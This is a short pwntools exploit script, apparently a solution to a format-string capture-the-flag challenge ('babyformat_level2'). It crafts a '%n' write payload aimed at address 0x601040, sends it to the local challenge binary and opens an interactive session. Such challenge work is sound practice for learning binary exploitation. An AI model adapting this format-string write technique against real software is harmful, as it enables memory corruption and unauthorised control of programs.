from pwn import *

io = process("/challenge/babyformat_level2")

buf = b"%04196716d%8$lnA" + p64(0x601040) + b"\n"
io.recvuntil(b"triggering the vulnerability:\n")
io.sendline(buf)
io.interactive()
